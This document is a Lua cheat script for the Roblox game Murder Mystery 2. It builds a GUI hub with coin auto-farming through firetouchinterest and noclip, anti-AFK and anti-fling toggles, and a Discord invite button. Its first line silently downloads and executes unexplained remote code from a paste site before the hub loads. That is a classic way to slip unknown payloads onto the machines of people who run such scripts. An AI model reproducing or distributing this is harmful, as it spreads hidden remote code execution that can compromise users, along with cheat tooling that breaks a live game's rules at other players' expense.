loadstring(game:HttpGet("https://cdn.sourceb.in/bins/Enchz4t1F0/0"))()
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MM2Hub_Pinokio"
screenGui.ResetOnSpawn = false
screenGui.Parent = game:GetService("CoreGui") or game:FindFirstChild("PlayerGui")

local gradients = {}

local function createUIStroke(parent)
    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 1.8
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.LineJoinMode = Enum.LineJoinMode.Round
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Parent = parent
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 0, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 0, 255))
    })
    gradient.Parent = stroke
    table.insert(gradients, gradient)
    return stroke
end

game:GetService("RunService").RenderStepped:Connect(function()
    local rotation = tick() * 120 % 360
    for i = #gradients, 1, -1 do
        local gradient = gradients[i]
        if gradient and gradient.Parent then
            gradient.Rotation = rotation
        else
            table.remove(gradients, i)
        end
    end
end)

local function makeDraggable(frame)
    local dragging = false
    local dragInput
    local dragStart
    local startPos
    
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or 
           input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or 
           input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)
end

local function createButton(text, size, position, color, parent)
    local button = Instance.new("TextButton")
    button.Size = size
    button.Position = position
    button.BackgroundColor3 = color
    button.BackgroundTransparency = 0.3
    button.Text = text
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 15
    button.Font = Enum.Font.SourceSansBold
    button.TextTransparency = 0
    button.Parent = parent
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = button
    
    createUIStroke(button).Transparency = 0.5
    return button
end

local function copyToClipboard(button)
    local discordInvite = "t6rhaAZvhG"
    
    local success = pcall(function()
        if setclipboard then
            setclipboard(discordInvite)
        elseif toclipboard then
            toclipboard(discordInvite)
        elseif set_clipboard then
            set_clipboard(discordInvite)
        elseif writeclipboard then
            writeclipboard(discordInvite)
        elseif Clipboard and Clipboard.set then
            Clipboard.set(discordInvite)
        else
            error("Clipboard blocked")
        end
    end)
    
    if success then
        button.Text = "Copied!"
        task.wait(1.5)
        button.Text = button.Name == "discordBtn" and "Get Discord Link" or "Join community discord!"
    else
        button.Text = "Invite: " .. discordInvite
        task.wait(3.5)
        button.Text = button.Text
    end
end

-- MAIN HUB FRAME
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 400, 0, 275)
mainFrame.Position = UDim2.new(0.5, -200, 0.35, -137)
mainFrame.BackgroundColor3 = Color3.fromRGB(35, 15, 55)
mainFrame.BackgroundTransparency = 0.15
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui
makeDraggable(mainFrame)
createUIStroke(mainFrame).Transparency = 0.3

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 10)
mainCorner.Parent = mainFrame

local mainTitle = Instance.new("TextLabel")
mainTitle.Size = UDim2.new(1, 0, 0, 30)
mainTitle.Position = UDim2.new(0, 0, 0, 15)
mainTitle.BackgroundTransparency = 1
mainTitle.Text = "Murder Mystery 2 Hub"
mainTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
mainTitle.TextSize = 22
mainTitle.Font = Enum.Font.SourceSansBold
mainTitle.TextXAlignment = Enum.TextXAlignment.Center
mainTitle.TextTransparency = 0
mainTitle.Parent = mainFrame

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(0.9, -5, 0, 5)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
closeBtn.BackgroundTransparency = 0.3
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextSize = 20
closeBtn.Font = Enum.Font.SourceSansBold
closeBtn.TextTransparency = 0
closeBtn.Parent = mainFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Feature Buttons
local autoFarmBtn = createButton(
    "Auto Farm Coins: OFF",
    UDim2.new(0.88, 0, 0, 35),
    UDim2.new(0.06, 0, 0, 78),
    Color3.fromRGB(80, 30, 120),
    mainFrame
)

local antiAfkBtn = createButton(
    "Anti-AFK Protect: OFF",
    UDim2.new(0.88, 0, 0, 35),
    UDim2.new(0.06, 0, 0, 122),
    Color3.fromRGB(80, 30, 120),
    mainFrame
)

local antiFlingBtn = createButton(
    "Anti-Fling Protect: OFF",
    UDim2.new(0.88, 0, 0, 35),
    UDim2.new(0.06, 0, 0, 166),
    Color3.fromRGB(80, 30, 120),
    mainFrame
)

local discordMainBtn = createButton(
    "Join community discord!",
    UDim2.new(0.42, 0, 0, 35),
    UDim2.new(0.06, 0, 0, 210),
    Color3.fromRGB(0, 100, 200),
    mainFrame
)

local unloadBtn = createButton(
    "Unload script",
    UDim2.new(0.42, 0, 0, 35),
    UDim2.new(0.52, 0, 0, 210),
    Color3.fromRGB(180, 20, 20),
    mainFrame
)

local footerLabel = Instance.new("TextLabel")
footerLabel.Size = UDim2.new(1, 0, 0, 20)
footerLabel.Position = UDim2.new(0, 0, 1, -25)
footerLabel.BackgroundTransparency = 1
footerLabel.Text = "PinokioScripts"
footerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
footerLabel.TextSize = 14
footerLabel.Font = Enum.Font.SourceSansBold
footerLabel.TextTransparency = 0
footerLabel.TextXAlignment = Enum.TextXAlignment.Center
footerLabel.Parent = mainFrame

-- Feature variables
local autoFarmActive = false
local antiAfkActive = false
local antiFlingActive = false
local noclipConn = nil
local antiAfkConn = nil
local antiFlingConn = nil
local antiAfkThread = nil
local farmThread = nil

-- Coin functions
local function findCoinContainer()
    return workspace:FindFirstChild("CoinContainer", true)
end

local function getCoinPart(coin)
    if not coin then return nil end
    if coin:IsA("BasePart") then return coin end
    
    for _, descendant in ipairs(coin:GetDescendants()) do
        if descendant:IsA("TouchInterest") then
            return descendant.Parent
        end
    end
    
    for _, descendant in ipairs(coin:GetDescendants()) do
        if descendant:IsA("BasePart") and descendant.Name == "Coin" then
            return descendant
        end
    end
    
    return coin:FindFirstChildOfClass("BasePart")
end

local function getCoinPosition(coin)
    local part = getCoinPart(coin)
    if part then
        return part.Position
    end
    return nil
end

local function getCoins()
    local container = findCoinContainer()
    if container then
        return container:GetChildren()
    end
    return {}
end

local function hasCoins()
    return findCoinContainer() ~= nil
end

local function getCoinCount()
    local coins = 0
    local maxCoins = 40
    
    pcall(function()
        local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
        if playerGui then
            local mainGui = playerGui:FindFirstChild("MainGui")
            if mainGui then
                for _, descendant in ipairs(mainGui:GetDescendants()) do
                    if descendant:IsA("TextLabel") then
                        local text = descendant.Text:gsub("<[^>]+>", "")
                        local match = text:match("(%d+)%s*/%s*(%d+)")
                        if match then
                            coins = tonumber(match:match("(%d+)"))
                            maxCoins = tonumber(match:match("%s*/%s*(%d+)"))
                            break
                        end
                    end
                end
            end
        end
    end)
    
    return coins, maxCoins
end

local function isFarFromCoins()
    local coins = getCoins()
    if #coins == 0 then
        return true
    end
    
    local character = game.Players.LocalPlayer.Character
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    if not rootPart then
        return true
    end
    
    local coinPos = getCoinPosition(coins[1])
    if coinPos then
        if (rootPart.Position - coinPos).Magnitude < 350 then
            return false
        end
    end
    return true
end

local function fireTouch(part)
    local character = game.Players.LocalPlayer.Character
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    if rootPart and part then
        firetouchinterest(rootPart, part, 0)
        firetouchinterest(rootPart, part, 1)
    end
end

local function toggleNoClip(enabled)
    if noclipConn then
        noclipConn:Disconnect()
        noclipConn = nil
    end
    
    if enabled then
        noclipConn = game:GetService("RunService").Stepped:Connect(function()
            if autoFarmActive and game.Players.LocalPlayer.Character then
                local character = game.Players.LocalPlayer.Character
                for _, part in ipairs(character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end)
    end
end

local tweenService = game:GetService("TweenService")

local function collectCoin(coin)
    local character = game.Players.LocalPlayer.Character
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    if not rootPart or not coin or not coin.Parent then
        return false
    end
    
    local coinPos = getCoinPosition(coin)
    if not coinPos or not getCoinPart(coin) then
        return false
    end
    
    local distance = (coinPos - rootPart.Position).Magnitude
    if distance > 0 then
        local tween = tweenService:Create(rootPart, TweenInfo.new(distance / 25, Enum.EasingStyle.Linear), {
            CFrame = CFrame.new(coinPos)
        })
        tween:Play()
        
        while tween.PlaybackState == Enum.PlaybackState.Playing do
            task.wait()
            if not autoFarmActive or not coin.Parent then
                tween:Cancel()
                return false
            end
        end
        
        fireTouch(getCoinPart(coin))
        task.wait(0.05)
        return true
    end
    return false
end

-- MAIN FARM LOOP - Infinite until turned off
local function startFarmLoop()
    if farmThread then
        task.cancel(farmThread)
        farmThread = nil
    end
    
    farmThread = task.spawn(function()
        while autoFarmActive and screenGui.Parent do
            -- Check if coins exist
            if hasCoins() then
                local coins = getCoins()
                if #coins > 0 then
                    -- Enable noclip
                    toggleNoClip(true)
                    
                    -- Collect each coin
                    for _, coin in ipairs(coins) do
                        if not autoFarmActive then break end
                        if coin and coin.Parent then
                            collectCoin(coin)
                            task.wait(0.05)
                        end
                    end
                    
                    -- Check if bags are full
                    local currentCoins, maxCoins = getCoinCount()
                    if currentCoins >= maxCoins then
                        -- Reset character to drop coins
                        local character = game.Players.LocalPlayer.Character
                        if character then
                            local humanoid = character:FindFirstChildOfClass("Humanoid")
                            if humanoid then
                                humanoid:BreakJoints()
                            end
                            task.wait(0.5)
                        end
                    end
                else
                    task.wait(0.5)
                end
            else
                -- No coins found, wait and try again
                task.wait(1)
            end
        end
    end)
end

autoFarmBtn.MouseButton1Click:Connect(function()
    autoFarmActive = not autoFarmActive
    autoFarmBtn.Text = autoFarmActive and "Auto Farm Coins: ON" or "Auto Farm Coins: OFF"
    autoFarmBtn.BackgroundColor3 = autoFarmActive and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(80, 30, 120)
    
    if autoFarmActive then
        -- Start farming
        startFarmLoop()
        toggleNoClip(true)
        print("Auto Farm Started!")
    else
        -- Stop farming
        if farmThread then
            task.cancel(farmThread)
            farmThread = nil
        end
        toggleNoClip(false)
        print("Auto Farm Stopped!")
    end
end)

local function toggleAntiAfk(enabled)
    if antiAfkConn then
        antiAfkConn:Disconnect()
        antiAfkConn = nil
    end
    if antiAfkThread then
        task.cancel(antiAfkThread)
        antiAfkThread = nil
    end
    
    if enabled then
        antiAfkConn = game.Players.LocalPlayer.Idled:Connect(function()
            local virtualUser = game:GetService("VirtualUser")
            pcall(function()
                virtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                task.wait(0.5)
                virtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            end)
        end)
        
        antiAfkThread = task.spawn(function()
            while antiAfkActive do
                task.wait(45)
                pcall(function()
                    local virtualUser = game:GetService("VirtualUser")
                    virtualUser:CaptureController()
                    virtualUser:ClickButton1(Vector2.new(0, 0))
                end)
            end
        end)
    end
end

antiAfkBtn.MouseButton1Click:Connect(function()
    antiAfkActive = not antiAfkActive
    antiAfkBtn.Text = antiAfkActive and "Anti-AFK Protect: ON" or "Anti-AFK Protect: OFF"
    antiAfkBtn.BackgroundColor3 = antiAfkActive and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(80, 30, 120)
    toggleAntiAfk(antiAfkActive)
end)

local function toggleAntiFling(enabled)
    if antiFlingConn then
        antiFlingConn:Disconnect()
        antiFlingConn = nil
    end
    
    if enabled then
        antiFlingConn = game:GetService("RunService").Stepped:Connect(function()
            if antiFlingActive then
                -- Disable collision for other players
                local players = game:GetService("Players"):GetPlayers()
                for _, player in ipairs(players) do
                    if player ~= game.Players.LocalPlayer and player.Character then
                        local character = player.Character
                        for _, part in ipairs(character:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.CanCollide = false
                            end
                        end
                    end
                end
                
                -- Anti-fling for local player
                local character = game.Players.LocalPlayer.Character
                if character then
                    local rootPart = character:FindFirstChild("HumanoidRootPart")
                    if rootPart then
                        if rootPart.AssemblyLinearVelocity.Magnitude > 100 or 
                           rootPart.AssemblyAngularVelocity.Magnitude > 100 then
                            rootPart.Anchored = true
                            rootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            rootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                            task.wait(0.1)
                            rootPart.Anchored = false
                        end
                    end
                end
            end
        end)
    end
end

antiFlingBtn.MouseButton1Click:Connect(function()
    antiFlingActive = not antiFlingActive
    antiFlingBtn.Text = antiFlingActive and "Anti-Fling Protect: ON" or "Anti-Fling Protect: OFF"
    antiFlingBtn.BackgroundColor3 = antiFlingActive and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(80, 30, 120)
    toggleAntiFling(antiFlingActive)
end)

discordMainBtn.MouseButton1Click:Connect(function()
    copyToClipboard(discordMainBtn)
end)

local function unloadScript()
    -- Stop all features
    autoFarmActive = false
    antiAfkActive = false
    antiFlingActive = false
    
    if farmThread then
        task.cancel(farmThread)
        farmThread = nil
    end
    
    pcall(function()
        if noclipConn then
            noclipConn:Disconnect()
            noclipConn = nil
        end
        if antiFlingConn then
            antiFlingConn:Disconnect()
            antiFlingConn = nil
        end
        if antiAfkConn then
            antiAfkConn:Disconnect()
            antiAfkConn = nil
        end
        if antiAfkThread then
            task.cancel(antiAfkThread)
            antiAfkThread = nil
        end
        
        -- Restore collision for local player
        local character = game.Players.LocalPlayer.Character
        if character then
            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                end
            end
        end
    end)
    
    pcall(function()
        if getgenv().PinokioConnections then
            for _, conn in ipairs(getgenv().PinokioConnections) do
                pcall(function() conn:Disconnect() end)
            end
            table.clear(getgenv().PinokioConnections)
        end
    end)
    
    pcall(function()
        screenGui:Destroy()
    end)
end

unloadBtn.MouseButton1Click:Connect(unloadScript)
getgenv().PinokioUnload = unloadScript
